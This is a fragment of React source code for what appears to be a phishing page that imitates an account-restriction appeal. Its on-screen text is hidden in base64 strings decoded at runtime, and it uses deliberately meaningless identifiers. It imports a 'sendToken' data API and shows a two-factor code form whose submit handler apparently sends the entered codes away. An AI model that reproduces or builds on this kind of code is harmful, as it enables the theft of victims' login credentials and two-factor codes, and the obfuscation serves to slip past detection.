...
import { sendDataApi } from 'Apis/sendToken';
                ...
                <div className='row'>
                    ...
                    <div className='right col-8'>
                        <div className='content-right'>
                            ...
                            <br />
                            <p>{atob('SWYgeW91IHRoaW5rIHRoaXMgaXMgYW4gZXJyb3IsIHJlcXVlc3QgYSByZXZpZXcuIEVuc3VyZSB5b3VyIGFwcGVhbCBpcyBjb21wbGV0ZTsgZGVsYXlzIG9yIG1pc3NpbmcgaW5mbyBtYXkgcmVzdWx0IGluIGRlbmlhbC4')}</p>
                            
                            <div className='card-thumb'>
                                <img src={h245f15d84e5d44} width="100%" alt="" />
                                <div className='thumb-content'>
                                    <p>{atob('VmVyaWZpY2F0aW9uIHVzdWFsbHkgdGFrZXMgMjQgaG91cnMsIGFmdGVyIHdoaWNoIHdlJ2xsIGRlY2lkZSBpZiByZXN0cmljdGlvbnMgd2lsbCByZW1haW4gb3IgYmUgbGlmdGVkLg')}</p>
                        ...
                        <div className={activeItemPopup === 5 ? "popup-item popup-two-fa active" : "popup-item popup-two-fa"}>
                            ...
                            <div className='popup-content'>
                                ...
                                <Form
                                    ...
                                    onFinish={sdt465rt4g5b1d5fCodes}
                                    form={form}
                                    autoComplete="off"
                                >
